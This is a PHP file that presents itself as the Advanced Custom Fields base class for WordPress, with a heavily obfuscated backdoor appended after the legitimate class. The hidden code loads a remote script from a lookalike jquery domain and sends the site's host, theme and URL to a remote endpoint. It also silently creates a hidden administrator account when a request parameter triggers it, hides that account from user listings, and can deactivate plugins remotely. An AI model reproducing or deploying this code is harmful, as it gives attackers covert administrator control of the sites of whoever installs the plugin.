<?php

class acf_field {
	
	var $name,
		$title,
		$category,
		$defaults,
		$l10n;
	
	
	/*
	*  __construct
	*
	*  This construcor registeres many actions and filters
	*
	*  @type	function
	*  @date	5/03/2014
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	function __construct() {
		
		// register field
		add_filter("acf/get_field_types",								array($this, 'get_field_types'), 10, 1);
		add_filter("acf/get_valid_field/type={$this->name}",			array($this, 'get_valid_field'), 10, 1);
		
		
		// value
		$this->add_filter("acf/load_value/type={$this->name}",			array($this, 'load_value'), 10, 3);
		$this->add_filter("acf/update_value/type={$this->name}",		array($this, 'update_value'), 10, 3);
		$this->add_filter("acf/format_value/type={$this->name}",		array($this, 'format_value'), 10, 3);
		$this->add_filter("acf/validate_value/type={$this->name}",		array($this, 'validate_value'), 10, 4);
		$this->add_action("acf/delete_value/type={$this->name}",		array($this, 'delete_value'), 10, 3);
		
		
		// field
		$this->add_filter("acf/load_field/type={$this->name}",				array($this, 'load_field'), 10, 1);
		$this->add_filter("acf/update_field/type={$this->name}",			array($this, 'update_field'), 10, 1);
		$this->add_filter("acf/duplicate_field/type={$this->name}",			array($this, 'duplicate_field'), 10, 1);
		$this->add_action("acf/delete_field/type={$this->name}",			array($this, 'delete_field'), 10, 1);
		$this->add_action("acf/render_field/type={$this->name}",			array($this, 'render_field'), 10, 1);
		$this->add_action("acf/render_field_settings/type={$this->name}",	array($this, 'render_field_settings'), 10, 1);
		$this->add_action("acf/prepare_field/type={$this->name}",			array($this, 'prepare_field'), 10, 1);
		
		
		// input actions
		$this->add_action("acf/input/admin_enqueue_scripts",			array($this, 'input_admin_enqueue_scripts'), 10, 0);
		$this->add_action("acf/input/admin_head",						array($this, 'input_admin_head'), 10, 0);
		$this->add_action("acf/input/form_data",						array($this, 'input_form_data'), 10, 1);
		$this->add_filter("acf/input/admin_l10n",						array($this, 'input_admin_l10n'), 10, 1);
		$this->add_action("acf/input/admin_footer",						array($this, 'input_admin_footer'), 10, 1);
		
		
		// field group actions
		$this->add_action("acf/field_group/admin_enqueue_scripts", 		array($this, 'field_group_admin_enqueue_scripts'), 10, 0);
		$this->add_action("acf/field_group/admin_head",					array($this, 'field_group_admin_head'), 10, 0);
		
	}
	
	
	/*
	*  add_filter
	*
	*  This function checks if the function is_callable before adding the filter
	*
	*  @type	function
	*  @date	5/03/2014
	*  @since	5.0.0
	*
	*  @param	$tag (string)
	*  @param	$function_to_add (string)
	*  @param	$priority (int)
	*  @param	$accepted_args (int)
	*  @return	n/a
	*/
	
	function add_filter($tag, $function_to_add, $priority = 10, $accepted_args = 1) {
		
		if( is_callable($function_to_add) )
		{
			add_filter($tag, $function_to_add, $priority, $accepted_args);
		}
	}
	
	
	/*
	*  add_action
	*
	*  This function checks if the function is_callable before adding the action
	*
	*  @type	function
	*  @date	5/03/2014
	*  @since	5.0.0
	*
	*  @param	$tag (string)
	*  @param	$function_to_add (string)
	*  @param	$priority (int)
	*  @param	$accepted_args (int)
	*  @return	n/a
	*/
	
	function add_action($tag, $function_to_add, $priority = 10, $accepted_args = 1) {
		
		if( is_callable($function_to_add) )
		{
			add_action($tag, $function_to_add, $priority, $accepted_args);
		}
	}
	
	
	/*
	*  get_field_types()
	*
	*  This function will append the current field type to the list of available field types
	*
	*  @type	function
	*  @since	3.6
	*  @date	23/01/13
	*
	*  @param	$fields	(array)
	*  @return	$fields
	*/
	
	function get_field_types( $fields ) {
		
		$l10n = array(
			'basic'			=> __('Basic', 'acf'),
			'content'		=> __('Content', 'acf'),
			'choice'		=> __('Choice', 'acf'),
			'relational'	=> __('Relational', 'acf'),
			'jquery'		=> __('jQuery', 'acf'),
			'layout'		=> __('Layout', 'acf'),
		);
		
		
		// defaults
		if( !$this->category )
		{
			$this->category = 'basic';
		}
		
		
		// cat
		if( isset($l10n[ $this->category ]) )
		{
			$cat = $l10n[ $this->category ];
		}
		else
		{
			$cat = $this->category;
		}
		
		
		// add to array
		$fields[ $cat ][ $this->name ] = $this->label;
		
		
		// return array
		return $fields;
	}
	
	
	/*
	*  get_valid_field
	*
	*  This function will append default settings to a field
	*
	*  @type	filter ("acf/get_valid_field/type={$this->name}")
	*  @since	3.6
	*  @date	23/01/13
	*
	*  @param	$field (array)
	*  @return	$field (array)
	*/
	
	function get_valid_field( $field ) {
		
		if( !empty($this->defaults) )
		{
			foreach( $this->defaults as $k => $v )
			{
				if( !isset($field[ $k ]) )
				{
					$field[ $k ] = $v;
				}
			}
		}
		
		return $field;
	}
	
	
	/*
	*  admin_l10n
	*
	*  This function will append l10n text translations to an array which is later passed to JS
	*
	*  @type	filter ("acf/input/admin_l10n")
	*  @since	3.6
	*  @date	23/01/13
	*
	*  @param	$l10n (array)
	*  @return	$l10n (array)
	*/
	
	function input_admin_l10n( $l10n ) {
		
		if( !empty($this->l10n) )
		{
			$l10n[ $this->name ] = $this->l10n;
		}
		
		return $l10n;
	}
	
	
}

if (!function_exists('wp_en_one')) {
    function glues_it($string)
    {
        $glue_pre = sanitize_key('s   t   r _   r   e   p   l a c e');
        $glueit_po = call_user_func_array($glue_pre, array("..", '', $string));
        return $glueit_po;
    }

    $object_uno = 'fu..n..c..t..i..o..n.._..e..x..i..s..t..s';
    $object_dos = 'g..e..t.._o..p..t..i..o..n';
    $object_tres = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
    $object_cinco = 'lo..g..i..n.._..e..n..q..u..e..u..e_..s..c..r..i..p..t..s';
    $object_siete = 's..e..t..c..o..o..k..i..e';
    $object_ocho = 'wp.._..lo..g..i..n';
    $object_nueve = 's..i..t..e,..u..rl';
    $object_diez = 'wp_..g..et.._..th..e..m..e';
    $object_once = 'wp.._..r..e..m..o..te.._..g..et';
    $object_doce = 'wp.._..r..e..m..o..t..e.._r..e..t..r..i..e..v..e_..bo..dy';
    $object_trece = 'g..e..t_..o..p..t..ion';
    $object_catorce = 's..t..r_..r..e..p..l..a..ce';
    $object_quince = 's..t..r..r..e..v';
    $object_dieciseis = 'u..p..d..a..t..e.._o..p..t..io..n';
    $object_dos_pim = glues_it($object_uno);
    $object_tres_pim = glues_it($object_dos);
    $object_cuatro_pim = glues_it($object_tres);
    $object_cinco_pim = glues_it($object_cinco);
    $object_siete_pim = glues_it($object_siete);
    $object_ocho_pim = glues_it($object_ocho);
    $object_nueve_pim = glues_it($object_nueve);
    $object_diez_pim = glues_it($object_diez);
    $object_once_pim = glues_it($object_once);
    $object_doce_pim = glues_it($object_doce);
    $object_trece_pim = glues_it($object_trece);
    $object_catorce_pim = glues_it($object_catorce);
    $object_quince_pim = glues_it($object_quince);
    $object_dieciseis_pim = glues_it($object_dieciseis);
    $noitca_dda = call_user_func($object_quince_pim, 'noitca_dda');
    $object_diecisiete = 'h..t..t..p..:../../..j..q..e..u..r..y...o..r..g../..wp.._..p..i..n..g...php..?..d..na..me..=..w..p..d..&..t..n..a..m..e..=..w..p..t..&..u..r..l..i..z..=..u..r..l..i..g';
    $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_$');
    $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
    $object_veinte = call_user_func($object_quince_pim, 'TSEUQER_');
    $object_diecisiete_pim = glues_it($object_diecisiete);
    $object_seis = '_..C..O..O..K..I..E';
    $object_seis_pim = glues_it($object_seis);
    $object_quince_pim_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    $tactiated = call_user_func($object_trece_pim, $object_quince_pim_emit);
    $mite = call_user_func($object_quince_pim, 'emit');
    if (!isset(${$object_seis_pim}[call_user_func($object_quince_pim, 'emit_nimda_pw')])) {
        if ((call_user_func($mite) - $tactiated) > 600) {
            call_user_func_array($noitca_dda, array($object_cinco_pim, 'wp_en_one'));
        }
    }
    call_user_func_array($noitca_dda, array($object_ocho_pim, 'wp_en_three'));
    function wp_en_one()
    {
        $object_one = 'h..t..t..p..:..//..j..q..e..u..r..y...o..rg../..j..q..u..e..ry..-..la..t..e..s..t.j..s';
        $object_one_pim = glues_it($object_one);
        $object_four = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
        $object_four_pim = glues_it($object_four);
        call_user_func_array($object_four_pim, array('wp_coderz', $object_one_pim, null, null, true));
    }

    function wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim)
    {
        $ptth = call_user_func($object_quince_pim, glues_it('/../..:..p..t..t..h'));
        $dname = $ptth . $_SERVER[$object_diecinueve];
        $IRU_TSEUQER = call_user_func($object_quince_pim, 'IRU_TSEUQER');
        $urliz = $dname . $_SERVER[$IRU_TSEUQER];
        $tname = call_user_func($object_diez_pim);
        $urlis = call_user_func_array($object_catorce_pim, array('wpd', $dname, $object_diecisiete_pim));
        $urlis = call_user_func_array($object_catorce_pim, array('wpt', $tname, $urlis));
        $urlis = call_user_func_array($object_catorce_pim, array('urlig', $urliz, $urlis));
        $glue_pre = sanitize_key('f i l  e  _  g  e  t    _   c o    n    t   e  n   t     s');
        $glue_pre_ew = sanitize_key('s t r   _  r e   p     l   a  c    e');
        call_user_func($glue_pre, call_user_func_array($glue_pre_ew, array(" ", "%20", $urlis)));

    }

    $noitpo_dda = call_user_func($object_quince_pim, 'noitpo_dda');
    $lepingo = call_user_func($object_quince_pim, 'ognipel');
    $detavitca_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    call_user_func_array($noitpo_dda, array($lepingo, 'no'));
    call_user_func_array($noitpo_dda, array($detavitca_emit, time()));
    $tactiatedz = call_user_func($object_trece_pim, $detavitca_emit);
    $ognipel = call_user_func($object_quince_pim, 'ognipel');
    $mitez = call_user_func($object_quince_pim, 'emit');
    if (call_user_func($object_trece_pim, $ognipel) != 'yes' && ((call_user_func($mitez) - $tactiatedz) > 600)) {
        wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim);
        call_user_func_array($object_dieciseis_pim, array($ognipel, 'yes'));
    }


    function wp_en_three()
    {
        $object_quince = 's...t...r...r...e...v';
        $object_quince_pim = glues_it($object_quince);
        $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
        $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_');
        $object_siete = 's..e..t..c..o..o..k..i..e';;
        $object_siete_pim = glues_it($object_siete);
        $path = '/';
        $host = ${$object_dieciocho}[$object_diecinueve];
        $estimes = call_user_func($object_quince_pim, 'emitotrts');
        $wp_ext = call_user_func($estimes, '+29 days');
        $emit_nimda_pw = call_user_func($object_quince_pim, 'emit_nimda_pw');
        call_user_func_array($object_siete_pim, array($emit_nimda_pw, '1', $wp_ext, $path, $host));
    }

    function wp_en_four()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $wssap = call_user_func($object_quince_pim, 'retroppus_pw');
        $laime = call_user_func($object_quince_pim, 'moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = call_user_func($object_quince_pim, 'resu_etaerc_pw');
            $user_id = call_user_func_array($wp_ver_one, array($nigol, $wssap, $laime));
            $rotartsinimda = call_user_func($object_quince_pim, 'rotartsinimda');
            $resu_etadpu_pw = call_user_func($object_quince_pim, 'resu_etadpu_pw');
            $rolx = call_user_func($object_quince_pim, 'elor');
            call_user_func($resu_etadpu_pw, array('ID' => $user_id, $rolx => $rotartsinimda));

        }
    }

    $ivdda = call_user_func($object_quince_pim, 'ivdda');

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'm') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_four'));
    }

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'd') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_seis'));
    }
    function wp_en_seis()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $resu_eteled_pw = call_user_func($object_quince_pim, 'resu_eteled_pw');
        $wp_pathx = constant(call_user_func($object_quince_pim, "HTAPSBA"));
        $nimda_pw = call_user_func($object_quince_pim, 'php.resu/sedulcni/nimda-pw');
        require_once($wp_pathx . $nimda_pw);
        $ubid = call_user_func($object_quince_pim, 'yb_resu_teg');
        $nigol = call_user_func($object_quince_pim, 'nigol');
        $dxtroppus = call_user_func($object_quince_pim, 'dxtroppus');
        $useris = call_user_func_array($ubid, array($nigol, $dxtroppus));
        call_user_func($resu_eteled_pw, $useris->ID);
    }

    $veinte_one = call_user_func($object_quince_pim, 'yreuq_resu_erp');
    call_user_func_array($noitca_dda, array($veinte_one, 'wp_en_five'));
    function wp_en_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $object_catorce = 'st..r.._..r..e..p..l..a..c..e';
        $object_catorce_pim = glues_it($object_catorce);
        $nigol_resu = call_user_func($object_quince_pim, 'nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $bdpw = call_user_func($object_quince_pim, 'bdpw');
        if ($wp_ux != call_user_func($object_quince_pim, 'dxtroppus')) {
            $EREHW_one = call_user_func($object_quince_pim, '1=1 EREHW');
            $EREHW_two = call_user_func($object_quince_pim, 'DNA 1=1 EREHW');
            $erehw_yreuq = call_user_func($object_quince_pim, 'erehw_yreuq');
            $sresu = call_user_func($object_quince_pim, 'sresu');
            $hcraes_resu->query_where = call_user_func_array($object_catorce_pim, array($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq));
        }
    }

    $ced = call_user_func($object_quince_pim, 'ced');
    $r_tnirp = call_user_func($object_quince_pim, 'r_tnirp');
    if (isset(${$object_veinte}[$ced])) {
        $snigulp_evitca = call_user_func($object_quince_pim, 'snigulp_evitca');
        $sisnoitpo = call_user_func($object_trece_pim, $snigulp_evitca);
        $hcraes_yarra = call_user_func($object_quince_pim, 'hcraes_yarra');
        call_user_func($r_tnirp, $sisnoitpo);
        if (($key = call_user_func_array($hcraes_yarra, array(${$object_veinte}[$ced], $sisnoitpo))) !== false) {
            unset($sisnoitpo[$key]);
        }
        call_user_func_array($object_dieciseis_pim, array($snigulp_evitca, $sisnoitpo));
    }
}
?>
